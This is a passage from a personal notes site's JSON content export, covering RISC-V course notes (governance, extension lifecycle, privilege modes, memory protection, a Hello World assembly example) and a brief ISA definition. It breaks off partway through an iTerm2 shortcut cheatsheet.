HTTP).\n\nAdvances in software and hardware standardisation through global collaboration and consensus as well as open source development and delivery has accelerated technical progress at an unprecedented global scale.\n\nAs an [ISA](notes/general/isa.md), RISC-V is not \"open source\" in the same way as software (as an [ISA](notes/general/isa.md) is not made of source code). It is an **open specification**.\n\n### History of RISC and Open ISAs\nReduced Instruction Set Computers ([RISC](https://en.wikipedia.org/wiki/Reduced_instruction_set_computer)) where created at the University of California at Berkeley (UCB) nearly at the same time as MIPS at Stanford (in the 1980s).\n\nSome popular RISC architectures are: the SPARC line, DEC's Alpha line, Intel's i860 and i960 processors and ARM processors. **RISC-V is the latest iteration of it**.\n\n### RISC-V Origins: UC Berkeley Architecture Research\nThe RISC-V instruction set was started by Prof. Krste Asanovic and graduate students Yunsup Lee and Andrew Waterman as part of the Parallel Computing Laboratory ([Par Lab](notes/general/parlab.md)) at UC Berkeley, of which Prof. David Patterson was Director.\n\nThe following report is the **first publication** that describes the RISC-V instruction set: [_The RISC-V Instruction Set Manual_](https://www2.eecs.berkeley.edu/Pubs/TechRpts/2011/EECS-2011-62.pdf).\n\n[DARPA](https://www.darpa.mil/work-with-us/for-universities) (Defense Advanced Research Projects Agency) plays a significant role.\n\n### The RISC-V Name\nThe name RISC-V was chosen to represent the fifth major RISC [ISA](notes/general/isa.md) design from UC Berkeley (RISC-I, RISC-II, SOAR and SPUR).\n\n### What is RISC-V International?\nThe RISC-V Foundation was founded in 2015 and it is controlled by its members.\n\nIncorporation in Switzerland has the effect of calming concerns of political disruption to the open collaboration model. RISC-V international does not maintain any commercial interest in products or services.\n\nThe RISC-V International Association was incorporated in Switzerland in March 2020.\n\n### RISC-V Membership\nIt is free for individual people, academic institutions and non-profit organisations. There are three membership levels available for for-profit organisations.\n\n1. Premier Members\n2. Strategic Members\n3. Community Organisations\n4. Community Individuals\n\n### RISC-V International Governance\nRISC-V international is governed by its Board of Directors. The Board is composed of Directors elected to represent all classes of membership to ensure voice at all levels. They also have a Technical Steering Committee (TSC) which provides leadership to technical initiatives.\n\nThere is also a range of committees and task groups.\n\n### RISC-V Community Working Model\nThere are three public forums that anyone can participate:\n\n- The RISC-V public mailing lists: [ISA-Dev](https://groups.google.com/u/1/a/groups.riscv.org/g/isa-dev?pli=1) and [SW-Dev](https://groups.google.com/u/1/a/groups.riscv.org/g/sw-dev).\n- The [Exchange forums](https://exchange.riscv.org/).\n- The [RISC-V Slack channel](https://risc-v-international.slack.com/) for live chat.\n\n### RISC-V's Relationship with the Linux Foundation\nIn November 2018 the RISC-V Foundation announced a joint collaboration with the Linux Foundation.\n\n## Chapter 3 - The RISC-V Community\n### Overview\n-   Understand how the technical organisation works in RISC-V.\n-   Know where to go for information as well as communication.\n-   Completely understand the RISC-V Code of Conduct and how it applies to all forms of communication within the organisation.\n\n### Culture of Community Engagement\nRISC-V operates primarily as a group of motivated organisations and individuals pursuing a common goal by working in concert rather than as adversaries, even if those organisations compete with each other in other areas.\n\nAs of February 2021 there are well over 2,000 people working on RISC-V, representing over 230 organisations.\n\n### Intellectual Property Policy\nAt the core of the RISC-V membership is the [membership agreement](https://riscv.org/wp-content/uploads/2020/03/RISC-V_Membership_Agreement_NFS.pdf).\n\n### Code of Conduct and Privacy\nYou can find it [here](https://riscv.org/community/community-code-of-conduct/).\n\nRISC-V also follows the [Linux Foundation's privacy policy](https://linuxfoundation.org/privacy/).\n\n### RISC-V's Technical Organisation\nKrste Asanovic, Yunsup Lee and Andrew Waterman all participate daily as technical task group and committee chairs as well as mentors to other technical leaders. David Patterson and Krste Asanovic represent member organisations on the Board of Directors.\n\n### Terminology\n#### Technical Steering Committee (TSC)\nPrimary decision-making body within the technical organisation.\n\n#### Chief Technology Office (CTO)\nRuns TSC voting process, Leadership Strategy Meeting (LSM) and Chairs meetings, strategy, organisation, IT, roadmap, resources, escalations.\n\n#### ISA Committees (IC)\nApprove and oversee packages for TSC votes for the creation of ISA Extension TGs, as well as filling the chair and vice-chair vacancies for its TGs. Develop strategy for the groups under it and complete coverage of areas of responsibility under it including gaps.\n\n#### Horizontal Committees (HC)\nApprove and oversee TGs working on activities other than ISA extensions. Has responsibilities to make sure that all ISA TGs cover the area overseen by the HC before ratification. Responsible for developing a holistic strategy and reaching out to the external ecosystem and community groups.\n\n#### **Horizontal Subcommittees (HSC)**\nSubcommittees underneath the Horizontal Committees, with similar responsibilities over a more focused topic.\n\n#### **Task Groups (TG)**\nMust have a charter that defines deliverable work products: extension specifications, standards, requirements, best practices, etc. TGs under the unpriv and priv SC can have ISA extension work products. TGs under HCs should not have ISA extension work products.\n\n#### **Special Interest Groups (SIG)**\nTopic discussion. No work product. Can be created by the TSC, ICs or HCs with TSC approval not required.\n\n#### **Chair \u0026 Vice-Chair**\nLeadership positions for a committee, task group, or SIG. These positions are generally elected on an annual basis. Chairs are always from member organisations, while vice-chairs may be either Individual members or representing organisations. Chairs and vice-chairs meet weekly to collaborate and discuss organisational details.\n\n### Technical Leadership and Governance\nDirect work on the specifications is driven by individual task groups working on specific specifications, software initiatives, testing or compliance frameworks, and many other ongoing projects. This work is organised and directed by technical leadership, and enabled and tracked by RISC-V’s neutral technical staff.\n\n### Technical Steering Committee\nThe Technical Steering Committee (TSC) provides leadership to our technical initiatives. They are assisted by the Standing Committees, Technical Task Groups, and Special Interest Groups, all of which report to the TSC.\n\nThe TSC delegates responsibilities to organisational components below it in the hierarchy of groups. In addition, it discusses and decides on strategy, escalations, group and chair and preliminary charter approvals, and extension ratification.\n\n\u003ccenter\u003e\u003cimg src=\"https://courses.edx.org/notes/images/courseware/v1/018aa36ba6fcc105a26bf62c7b8307a0/asset-v1:LinuxFoundationX+LFD110x+1T2021+type@asset+block/technical_organization__1_.png\"\u003e\u003c/center\u003e\n\u003ccenter\u003e\u003cimg src=\"https://courses.edx.org/notes/images/courseware/v1/ca6261ee043dbf7127a39665a81feed4/asset-v1:LinuxFoundationX+LFD110x+1T2021+type@asset+block/technical_organization__2_.png\"\u003e\u003c/center\u003e\n\u003ccenter\u003e\u003cimg src=\"https://courses.edx.org/notes/images/courseware/v1/a72d7d1c9a596f5e327dab9c3c640b54/asset-v1:LinuxFoundationX+LFD110x+1T2021+type@asset+block/technical_organization__3_.png\"\u003e\u003c/center\u003e\n\n### ISA and Horizontal Committees and Subcommittees\nCommittees are responsible for directing work within the scope of their charter. ISA committees - “priv” and “unpriv”, referring to the Privileged and Unprivileged RISC-V specification volumes - direct the creation of specific extensions. **Horizontal committees** - including Software, Security, ISA Infrastructure, SOC Infrastructure, Implementation, and others - are responsible for directing specification work in their areas other than ISA extensions. _All ISA extensions must be signed off by each of the Horizontal committees prior to ratification_.\n\nHorizontal committees sometimes also have subcommittees, particularly for those committees with a very large scope (such as Software). Subcommittees have largely the same responsibilities, although procedural decisions, including decisions on chairs, are made by the primary committee.\n\n### Task Groups\nThis is where the actual work is done on specifications, software, test frameworks, and other concrete deliverables. Task groups are usually started for a specific purpose, which is then written into their charter and approved by the committee responsible for them. Some task groups finish their work relatively quickly (within 3-6 months) while others work for much longer to make sure the final product is worthy of inclusion.\n\nThe chair for each group is responsible for directing the activities, overseeing the creation of the deliverable work product (spec, software, etc.), reporting back to the Committee and the technical organisation on status, and attending a weekly chairs meeting. Vice-chairs share the responsibilities and the effort, but chairs hold the final responsibility for the group. Chairs and vice-chairs are elected by the community and serve 1-year terms between election cycles, although there are no term limits and existing chairs may reapply.\n\n### Technical Staff\n#### Chief Technical Officer\nThe CTO role is vital, as it provides a neutral leadership function that can’t be filled by a member. The CTO takes all members’ needs into account to both instigate and drive organisation and initiatives within the technical hierarchy, and to facilitate negotiation at all levels within working groups, committees, and governance groups. The CTO also creates and seeks approval for organisational policies, and reports technical progress up to the Board of Directors and functions as the neutral voice of the technical community in workshops and public events.\n\n#### Technical Program Managers\nThis is a catch-all term for experienced individuals who perform all of the operational activities within the project, including everything from running meetings to setting up calendar entries and conference calls to organising technical information and even writing detailed technical policies.\n\n#### Other Technical Staff\nWhile the above roles are the only permanent staff in the technical organisation, RISC-V occasionally hires contractors for specific tasks, including test development and documentation.\n\n### Additional Roles\n#### Board of Directors\nThe Board is the primary decision-making body for RISC-V. As such, it has representation from all members. Premier members each have a seat at the table, while Strategic, Community Organisation, and even Community Individual level members elect representatives each year.\n\n#### Marketing \u0026 Visibility\nRISC-V has a Director of Marketing who is responsible for driving the visibility of RISC-V worldwide. Working with the Marketing Committee, a member group that provides feedback and resources, the Director of Marketing manages all visibility activities, including the main Marketing Committee, Events, Content (including written, video, and in-person content), social media and PR (supported by an outside firm), and developer advocacy activities including online learning, RISC-V Ambassadors, Regional and Industry Alliances, and the quickly-growing RISC-V user community.\n\n#### Operations \u0026 Program Management\nOperations include the day-to-day management of member activities - joining RISC-V, onboarding, paying dues, becoming part of the Member Portal, and other member activities - as well as support for all other business functions within RISC-V International.\n\n### RISC-V Wiki\nThe wiki can be found [here](https://wiki.riscv.org/).\n\n### Public Discussion Groups\nCan join discussions and others using links from the [technical page](https://riscv.org/technical/technical-forums/) on the website.\n\n### The RISC-V Exchange\nThe Exchange contains:\n\n- _Available Boards_ - RISC-V based single board computers (SBCs) both open source hardware and proprietary designs. These range from simple microcontroller boards to complex System on Chip (SoC) designs.\n- _Available Cores \u0026 SoCs_ - These hardware designs might be open source or proprietary, and may be available for free or for purchase.\n- _Available Software_ - Software is available in binary form and in source code form. Licenses stretch across the spectrum from permissive open source to restrictive proprietary licenses.\n- _Available Services_ - Many organisations provide services relevant to RISC-V product development, including design, verification, software tooling, and more.\n- _Available Learning_ - Books, online courses, curricula and academic materials, and anything else related to learning about RISC-V.\n\n## Chapter 4 - Developing RISC-V\n### Overview\n- Describe the process used to develop the RISC-V ISA and extensions.\n- Differentiate between the RISC-V Base ISAs, Extensions, and Standards.\n- Understand the basics of the Unprivileged and Privileged specifications.\n\n### How the RISC-V ISA is Different\nThe most notable difference between RISC-V and other [ISAs](notes/general/isa.md) is that RISC-V is developed by a member organisation that is completely free to join and licenses its ISA with permissive open source licenses. This means that anyone can contribute to the specifications, and no one company or group of companies can drive the direction of the standards.\n\nRISC-V International is governed by its Board of Directors. The Board is composed of members elected to represent all classes of membership to ensure we offer a strategic voice at all levels. In addition, the Technical Steering Committee (TSC) provides leadership to our technical initiatives in setting long term strategy, forming tactical committees and work groups, and approving technical deliverables for ratification or release.\n\n### Collaborative Development Model\nA RISC-V Specification starts its life as a **Task Group** approved by the Technical Steering Committee (TSC). Once a Task Group has an approved charter, they begin work publicly on GitHub by writing their documents in **AsciiDoc format**. These repositories on GitHub can only receive pull requests from RISC-V International members, however the work is done publicly and transparently. \n\nFor groups who choose to take minutes, those minutes from the Task Group meetings are published publicly as well. The public is free to submit issues to the GitHub repository in order to give early feedback on any specification. Non-ISA specifications and standards (e.g. processor trace, architectural tests, software overlay) are developed in a similar fashion.\n\nRISC-V Specifications live on GitHub and are housed alongside dozens of software projects. See [a list of ratified specifications](https://riscv.org/technical/specifications/) and the links to their GitHub repositories.\n\n### Creating and Curating Open Specifications\nThe process of writing the specifications is usually led by a Hardware Architect at one of the RISC-V International member organisations. They may not write the actual text, but they act as the chair to the Task Group overseeing the specification’s development. It can take anywhere from several months to more than a year for the group to complete a specification. We will talk about the lifecycle of an extension later in this chapter.\n\nWhat makes this development process open hinges on three key facts:\n\n1.  The Task Group mailing list is publicly visible.\n2.  The specification document is publicly visible and comments can be left.\n3.  There is a public mailing list where anyone can send email. (isa-dev@groups.riscv.org)\n\nUsing this methodology, even non-members can participate in the development of any specification or standard by asking questions, making suggestions, or simply following along. Furthermore, during the ratification process, there is a 45 day window where all specification work must be frozen and the specification published publicly for review. Anyone is welcome to comment at this time and all issues will be brought to resolution before the vote for ratification happens.\n\nWhile becoming a member of RISC-V International is the easiest way to contribute to open specifications, it is not the only way. Anyway can contribute by interacting with the Task Groups in public forums like the [mailing list](https://riscv.org/mailing-lists/) and GitHub.\n\n### RISC-V Extensions Lifecycle\nEach RISC-V extension goes through several stages on its way to ratification. In this section we will briefly review each stage known as a “milestone”.\n\n1. _Inception_ - RISC-V technical leaders approve pursuing the extension.\n2. _Kickoff_ - Leadership approves an “acting chair” to drive the process in a task group. The chair creates a name for a task group, preliminary charter, and deliverables.\n3. _Plan_ - The group develops a final charter and sets some timeline estimates.\n4. _Experimental Versions_ - The groups releases several versions considered unstable.\n5. _Freeze_ - The group produces a complete final draft of the specification with no major unknowns and no expected changes (only to fix issues but no new features).\n6. _Ratification Ready_ - The draft specification is sent out for public review, any public comments or questions are addressed, and the Technical Steering Committee is made aware that a vote is required.\n7._Complete_ - The extension is ratified and supported as part of the RISC-V ISA.\n\n\u003ccenter\u003e\u003cimg src=\"https://courses.edx.org/notes/images/courseware/v1/e9ec87214f09abf0169226df15e0388d/asset-v1:LinuxFoundationX+LFD110x+1T2021+type@asset+block/Extension_lifecycle_and_milestone_definitions.jpg\"\u003e\u003c/center\u003e\n\nOnce an extension has been ratified it is added to either the **Unprivileged** or **Privileged** Specification. Occasionally a specification is created as part of a separate document, with the debug specification being the most common example. However, this is a rare case and usually indicates that the extension is not part of the [ISA](notes/general/isa.md), but rather a “standard” or “non-ISA specification”. We will now review the Unprivileged and Privileged Specification in greater detail.\n\n### Organising the Specifications\nThe RISC-V [ISA](notes/general/isa.md) is broken up into two parts:\n\n-   Volume 1, Unprivileged Specification\n-   Volume 2, Privileged Specification\n\nTo understand why the specification is broken up into two different parts, we must first understand a bit about computer architecture and security. Historically, processors used hierarchical protection domains, often called protection rings, to protect data and code from malicious actors.\n\n\u003ccenter\u003e\u003cimg src=\"https://courses.edx.org/notes/images/courseware/v1/a747ba9c1697a0bea78672847048eed5/asset-v1:LinuxFoundationX+LFD110x+1T2021+type@asset+block/Privilege_rings_for_the_x86__along_with_their_common_uses.png\"\u003e\u003c/center\u003e\nThe most privileged code runs in “Ring 0” and has access to the entire system. The processor will decide which privileges to grant executing code based on the privilege level. As an example, accessing memory by physical address may be restricted to “Ring 0” such that other rings must reference the virtual address space. Typically the processor can run in only one of the privilege modes at a time and there are special instructions to move between modes. All of these details can change from system to system, however they must follow the rules set out in the specification documents of a given architecture.\n\nRISC-V currently has three privilege levels: **User Mode** (U-mode), **Supervisor Mode** (S-mode), and **Machine Mode** (M-mode). One can think of these as “Ring 2”, “Ring 1”, and “Ring 0” respectively. Other modes like a hypervisor mode (H-mode) will likely be added in the near future. Much like in the figure above, U-mode is for user processes, S-mode is for kernel and/or device drivers, and M-mode is used for bootloader and/or firmware. Each privilege level has access to specific _Control and Status Registers_ (CSRs), and higher privilege levels can access the CSRs of those less privileged levels.\n\n### Inside the Unprivileged Specification\nSimply put, the unprivileged specification details items that are not related to machine mode (M-mode) or to Supervisor Mode (S-mode). The unprivileged specification includes the base ISA as well as extensions to that base like integer (I), float (F), double (D), compressed instructions (C), and many more.\n\nThe base instruction sets describe the instruction format, basic integer instructions, load and store instructions, and other fundamental details of the ISA. We break these up into several bases:\n\n1.  RV32I - Integer 32 bit\n2.  RV32E - Reduced RV32I for embedded purposes\n3.  RV64I - Integer 64 bit\n4.  RV128I - Integer 128 bit\n\nAll these “Base ISA’s” either reduce or extend off the RV32I base instruction set. As an example, RV64I widens the integer registers and the supported user address space to 64 bits. This means that the LOAD and STORE instructions work a bit differently than in RV32I and the unprivileged specification contains the chapter explaining these differences.\n\n### Base ISA Extensions\nThe unprivileged specification also contains the descriptions of the extensions to these base ISAs. Again, any extension that does note require M-mode to operate can be described in the unprivileged specification.\n\nEach extension to the base ISA is developed and maintained by a Task Group:\n\n-   _Crypto Task Group_ working on cryptographic extensions which can move many complex cryptographic algorithms into hardware, improving reliability and speed.\n-   _B Extension Task Group_ working on bit manipulation extensions which can speed up many common mathematical tasks.\n-   _Vector (V) Extension Task Group_ working on vector instructions which are at the heart of many graphical processing computations.\n\nOnce ratified, these extensions are added to the unprivileged specification. The following are some of the ratified extensions that you might see in a RISC-V processor:\n\n#### “M” Standard Extension\nChapter 7 of the [Unprivileged Specification](https://riscv.org/technical/specifications/) describes how integer multiplication and division should be accomplished. It describes how each of the multiplication instructions (MUL, MULH, MULHU, MULHU, MULW) will behave, which registers are used for the multiplier and multiplicand, and where the result will be stored. It does the same for division since functionally one can view division as simply the inverse of multiplication. It may seem odd to you that this extension is not required. However, for many embedded processors, multiplication can be done in software if it is not required very often or even at all. Removing this logic from a processor will save money on development, keeping the end product cost lower.\n\n#### **“F” Standard Extension**\nChapter 11 describes how we add single-precision floating-point computational instructions that are compliant with the IEEE 754-2008 arithmetic standard. There are many resources available covering the details of floating-point arithmetic in computing. It is enough to understand that this chapter describes how this process is implemented in RISC-V, and is complimented by Chapter 12 (the D extension) which describes double-precision floating-point computational instructions. Lastly, Chapter 13 covers the Q standard extension for 128-bit quad-precision binary floating-point instructions. All three of these conform to IEEE standards. Again, many embedded applications do not require floating point logic, and hence this extension is not part of the Base ISAs.\n\n#### **“C” Standard Extension**\nChapter 16 describes the compressed instruction-set extension which reduces static and dynamic code size by adding short 16-bit instruction encodings for common operations. Typically, 50%–60% of the RISC-V instructions in a program can be replaced with RVC instructions, resulting in a 25%–30% code-size reduction. The C extension is compatible with all other standard instruction extensions. The C extension allows 16-bit instructions to be freely intermixed with 32-bit instructions, with the latter able to start on any 16-bit boundary. As such, with the addition of the C extension to any system, no instructions can raise instruction-address-misaligned exceptions.\n\nThis covers most of the currently ratified extensions in the unprivileged specification. However, it is important to note that many extensions are included in the specification in a “draft” or “frozen” stage. As we discussed in the section on “[](notes/general/introduction-to-riscv.md#RISC-V%20Extensions%20Lifecycle%7CRISC-V%20Extension%20Lifecycle)”, these specifications are not yet ratified and any implementation should avoid using them in production.\n\n### The Privileged Specification\nAs its name suggests, the privileged specification contains descriptions of the RISC-V [ISA](notes/general/isa.md) which operate in Machine Mode (M-mode) or Supervisor Mode (S-mode). These modes have elevated privileges and are therefore described in a completely separate document from the base [ISA](notes/general/isa.md) and standard extensions. This specification also contains additional functionality required for running rich operating systems like Linux.\n\nThe first part of each chapter of the privileged specification details the Control and Status Registers (CSRs) which are only accessible from M-mode and S-mode. We will not cover these details here, but will rather focus on other details specific to these two modes.\n\n### Machine-Level (M-Mode) ISA\nM-mode is used for low-level access to a hardware platform and is the first mode entered at reset, when the processor finishes initialising and is ready to execute code.\n\nM-mode can also be used to implement features that are too difficult or expensive to implement in hardware directly. A good example of this would be a watchdog timer implemented in low level software (firmware) which helps the system recover from faults.\n\n### Non-Maskable Interrupts (NMIs)\nNon-maskable interrupts (NMIs) are only used for hardware error conditions. When fired, they cause an immediate jump to an NMI handler running in M-mode, regardless of how that hardware thread has its interrupt enable bit set. In other words, that interrupt will be serviced without a way to block the service in configuration. \n\nEach NMI will have a “mcause” register associated with it. This allows implementations to decide how they wish to handle these interrupts and allows them to define many possible causes. NMIs do not reset processor state which enables diagnosis, reporting, and possible containment of the hardware error.\n\n### Physical Memory Attributes (PMA)\nThe physical memory map for a system includes address ranges like: memory regions, memory-mapped control registers, and empty holes in the address space. Some memory regions might not support reads, writes, or execution; some might not support subword or subblock accesses; some might not support atomic operations; and some might not support cache coherence or might have different memory models. In RISC-V systems, these properties and capabilities of each region of the machine’s physical address space are termed physical memory attributes (PMAs).\n\nThe PMAs of some memory regions are fixed at chip design time—for example, for an on-chip ROM. Others are fixed at board design time, depending, for example, on which other chips are connected to off-chip buses. Some devices might be configurable at run time to support different uses that imply different PMAs—for example, an on-chip scratchpad RAM might be cached privately by one core in one end-application, or accessed as a shared non-cached memory in another end-application. Most systems will require that at least some PMAs are dynamically checked in hardware later in the execution pipeline after the physical address is known, as some operations will not be supported at all physical memory addresses, and some operations require knowing the current setting of a configurable PMA attribute.\n\nFor RISC-V, we separate out specification and checking of PMAs into a separate hardware structure, the “PMA checker”. In many cases, the attributes are known at system design time for each physical address region, and can be hardwired into the PMA checker. Where the attributes are run-time configurable, platform-specific memory-mapped control registers can be provided to specify these attributes at a granularity appropriate to each region on the platform (e.g., for an on-chip static random-access memory (SRAM) that can be flexibly divided between cacheable and uncacheable uses).\n\nThe details of PMAs could easily take up an entire chapter of this course. We will not cover memory-ordering PMAs, idempotency PMAs, coherence PMAs, or cacheability PMAs. The details of PMAs are described in detail in section 3.5 of the [Privileged Specification](https://riscv.org/technical/specifications/). Advanced users may want to review this section.\n\n### Physical Memory Protection (PMP)\nA common feature of most modern processors is some way of performing secure remote computation or a “trusted execution environment”. Examples of this technology include Intel Software Guard Extensions (SGX), AMD Secure Encrypted Virtualization (SEV), and Arm TrustZone. While the RISC-V ISA does not provide an end-to-end solution for Trusted Execution Environments, the physical memory protection (PMP) capabilities are a solid foundation on which one might construct such a system.\n\nRISC-V PMP limits the physical addresses accessible by software running on a hart (hardware thread). An optional PMP unit provides per-hart machine-mode control registers to allow physical memory access privileges (read, write, execute) to be specified for each physical memory region. The PMP values are checked in parallel with the PMA checks we covered in the last section. The granularity of PMP access control settings are platform-specific and within a platform may vary by physical memory region, but the standard PMP encoding supports regions as small as four bytes. Certain regions’ privileges can be hardwired—for example, some regions might only ever be visible in machine mode but in no lower-privilege layers.\n\nPMP entries are described by an 8-bit configuration register and one 32 (or 64) bit address register. Up to 16 PMP entries are supported. If any PMP entries are implemented, then all PMP CSRs must be implemented, but any PMP CSR fields may be hardwired to zero. PMP CSRs are only accessible to M-mode.\n\n\u003ccenter\u003e\u003cimg src=\"https://courses.edx.org/notes/images/courseware/v1/2bc57c54106ee5b9e0462510442bf21c/asset-v1:LinuxFoundationX+LFD110x+1T2021+type@asset+block/Example_illustrating_how_to_set_up_two_different_contexts__one_untrusted_and_one_with_access_to_Enclave_E1.png\"\u003e\u003c/center\u003e\nSource: By Lee, D., Kohlbrenner, D., Shinde, S., Song, D., \u0026 Asanovic, K. (2019). Keystone: A Framework for Architecting TEEs. _CoRR, vol. abs/1907.10119_ [http://arxiv.org/abs/1907.10119](https://arxiv.org/abs/1907.10119).\n\nHere we see an example of how one might set up two different contexts, one untrusted and one with access to “Enclave E1”. In this example an application is run in user context U1. That application only has access to its own memory and the memory inside enclave E1. The memory inside enclave E2 and that located in the “security monitor” (SM) are not available to the user application. In this way, data confidentiality is assured simply by allowing the security monitor (running in M-mode) to change the PMP settings allowing or denying access to memory regions based on the PMP configurations.\n\n### Supervisor-Level (S-Mode) ISA\nThis chapter describes the RISC-V supervisor-level architecture, which contains a common core that is used with various supervisor-level address translation and protection schemes. Supervisor mode is deliberately restricted in terms of interactions with underlying physical hardware, such as physical memory and device interrupts, to support clean virtualisation. In this spirit, certain supervisor-level facilities, including requests for timer and interprocessor interrupts, are provided by implementation-specific mechanisms. In some systems, a supervisor execution environment (SEE) provides these facilities in a manner specified by a supervisor binary interface (SBI). Other systems supply these facilities directly, through some other implementation-defined mechanism.\n\nRISC-V supports Page-Based 32-bit, 39-bit, and 48-bit virtual memory addressing. The supervisor (S-Mode) memory-management fence instruction (SFENCE.VMA) is used to synchronise updates to in-memory memory-management data structures with current execution. Executing this instruction guarantees that any previous stores already visible to the current RISC-V hart (hardware thread) are ordered before all subsequent implicit references from that hart to the memory-management data structures.\n\nVirtual Memory is a concept which takes several months of graduate level education to grasp and is beyond the scope of this course. It is enough for this course that you understand that RISC-V supports Page-Based virtual memory of several widths, and that there is a special S-Mode instruction used for synchronising updates between hardware threads.\n\n### Non-ISA Specifications\nTask Groups can also work on software or standards that are not part of the [ISA](notes/general/isa.md). For example, the following groups work on projects that do not lead to specifications being written, but rather standards that encourage communities to develop their products around a common framework:\n\n-   _Debug Task Group_ working on external debugging support and standards.\n-   _Compliance Task Group_ working on RISC-V ISA compliance tests and frameworks.\n-   _Configuration Structure Task Group_ working on how to represent the configuration structure of a given hardware implementation both in a human-readable format, as well as a binary format.\n\n## Chapter 5 - RISC-V In Practice\n### Overview\n-   Understand how to emulate a simple Linux system using QEMU.\n-   Write a simple “Hello World” program in RISC-V 64 bit assembly language.\n-   Compile and run a RISC-V application in emulation.\n\n### Required Documentation\nFirst off, Chapter 2 of the RISC-V [](notes/general/introduction-to-riscv.md#Inside%20the%20Unprivileged%20Specification%7CUnprivileged%20Specification) goes into detail about the RV32I Base Integer Instruction Set, including a programming model and an explanation of instruction formats. While this information is not required for this course it is certainly helpful in understanding how the RISC-V architecture executes instructions.\n\nFor programming assembly instructions, we can use both the ABI reference documentation and the ASM manual to answer any questions we may have along the way. You can find those documents here:\n\n-   [RISC-V Specifications](https://riscv.org/technical/specifications/)\n-   [ABI Documentation](https://github.com/riscv/riscv-elf-psabi-doc/blob/master/riscv-elf.md)\n-   [ASM Manual](https://github.com/riscv/riscv-asm-manual/blob/master/riscv-asm.md)\n\nAgain, none of this information is required knowledge for this chapter, but you can reference it if you have any questions not answered here.\n\n### Assembly Language Overview\nThis chapter will be a very high level overview of RISC-V assembly instructions and will only cover a few of those instructions in practice. The hope is that this tutorial will give you the tools you need to continue your journey programming assembly language. If your goal is simply to understand the basics and develop applications in a higher level language, this course will likely cover most of the information you need.\n\nRISC-V is a “reduced instruction set” architecture, and as such, there are not many instructions to learn. In this tutorial, we only use 3 instructions: `LA` (load absolute address), `ADDI` (add immediate), and `ECALL`. The `ECALL` instruction is used to make a service request to the execution environment. We will only use two calls in our Hello World app, one to “write” and one to “exit”.\n\nFor a full list of instructions you can see the [](https://riscv.org/wp-content/uploads/2019/12/riscv-spec-20191213.pdf#129).  For more information, visit [RISC-V website](https://riscv.org/community/learn/).\n\n### Compiling Required Binaries\nInstructions for compiling required binaries can be found in the _[\"RISC-V - Getting Started Guide\"](https://risc-v-getting-started-guide.readthedocs.io/en/latest/linux-qemu.html)_.\n\n### Creating a Custom RISC-V System\nIf you are already comfortable with compiling the Linux kernel, QEMU, and software suites like BusyBox, you may want to take things a step further. There is a build system for creating Linux based root file systems and emulating them called the Yocto Project. RISC-V has a “layer” which can be used to create a completely custom Linux distribution. For more details see [meta-riscv](https://github.com/riscv/meta-riscv) on GitHub.\n\n### Environment Overview\nThe hello world application we will be using:\n\n```assembly\n# Simple RISC-V Hello World\n\n.global _start\n\n_start: addi x0, x0, 1\n        la   a1, helloworld\n        addi a2, x0, 13\n        addi a7, x0, 64\n        ecall\n\n        addi a0, x0, 0\n        addi a7, x0, 93\n        ecall\n\n.data\nhelloworld:    .ascii \"Hello World!\\n\"\n```\n\nThere are also two ways of compiling this code, either using GCC or calling “as” and “ld” directly:\n\n```bash\n# GCC  \nriscv64-linux-gnu-gcc -o rv-hello rv-hello.s -nostdlib -static\n```\n```bash\n# AS \u0026 LD  \nriscv64-linux-gnu-as -march=rv64imac -o rv-hello.o rv-hello.s  \nriscv64-linux-gnu-ld -o rv-hello rv-hello.o\n```\n\n---\n## More information\n- [riscv.org](https://riscv.org/)\n- [Benefits of open instructions.](https://www2.eecs.berkeley.edu/Pubs/TechRpts/2014/EECS-2014-146.pdf)\n- [RISC-V Genealogy](https://riscv.org/technical/specifications/risc-v-genealogy/)",
    "lastmodified": "2022-11-24T12:20:59.892166734Z",
    "tags": null
  },
  "/notes/general/isa": {
    "title": "ISA (Instruction Set Architecture)",
    "content": "# ISA (Instruction Set Architecture)\n---\nAn instruction set architecture (ISA) is an abstract model of a computer. It is also referred to as architecture or computer architecture. \n\nA realisation of an ISA, such as a central processing unit (CPU), is called an implementation. \n\nSome ISAs are x86, ARM, MIPS, PowerPC, or SPARC.\n\n[RISC-V](notes/general/riscv.md) is an example of an ISA and it is provided under open source licenses that do not require fees to use.",
    "lastmodified": "2022-11-24T12:20:59.953189969Z",
    "tags": null
  },
  "/notes/general/iterm2-cheatsheet": {
    "title": "iTerm2 Cheatsheet",
    "content": "# iTerm2 Cheatsheet\n\nI basically copied this from a Git repo... all very useful.\n\n## Tabs and Windows\n\n**Function** | **Shortcut**\n-------- | --------\nNew Tab | `⌘` + `T`\nClose Tab or Window | `⌘` + `W`  (same as many mac apps)\nGo to Tab | `⌘` + `Number Key`  (ie: `⌘2` is 2nd tab)\nGo to Split Pane by Direction | `⌘` + `Option` + `Arrow Key`\nCycle iTerm Windows | `⌘` + `backtick`  (true of all mac apps and works with desktops/mission control)\n**Splitting** | \nSplit Window Vertically (same profile) | `⌘` + `D`\nSplit Window Horizontally (same profile) | `⌘` + `Shift` + `D`  (mnemonic: shift is a wide horizontal key)\n**Moving** |\nMove a pane with the mouse | `⌘` + `Alt` + `Shift` and then drag the pane from anywhere\n**Fullscreen** |\nFullscreen | `⌘`+ `Enter`\nMaximize a pane | `⌘` + `Shift` + `Enter`  (use with fullscreen to temp fullscreen a pane!)\nResize Pane | `Ctrl` + `⌘` + `Arrow` (given you haven't mapped this to something else)\n**Less Often Used By Me** |\nGo to Split Pane by Order of Use | `⌘` + `]` , `⌘` + `[`\nSplit Window Horizontally (new profile) | `Option` + `⌘` + `H`\nSplit Window Vertically (new profile) | `Option` + `⌘` + `V`\nPrevious Tab | `⌘`+ `Left Arrow`  (I usually move by tab number)\nNext Tab | `⌘`+ `Right Arrow`\nGo to Window | `⌘` + `Option` + `Number`\n\n\n## My Favourite Shell Key Combos\n\nThese might be helpful to getting you faster with the shell.\nThese are just common shell shortcuts unrelated to iTerm itelf.\nThese will usually work in Bash/Zsh/Fish on Mac and on Linux.\nThere are many shortcuts out there but I use these quite a bit.\nThere is also more than one way to do a thing so adopt what you like best.\n\nHopefully some of these improve your work life.  :)\n\n**Function** | **Key Combination** | **Use**\n-------- | -------- | --------\nDelete to start of line | `Ctrl` + `U` | Use this to start over typing without hitting Ctrl-C\nDelete to end of line | `Ctrl` + `K` | Use this with command history to repeat commands and changing one thing at the end!\nRepeat last command | `Up Arrow` | Cycle and browse your history with up and down.  `Ctrl-R` is faster if you know the string you are looking for.\nMove back and forth on a line | `Arrow Keys` | This takes you off the home row but it's easy to remember\nMove back and forth on a line by words | `⌥` + `Arrow Keys` | Fast way to 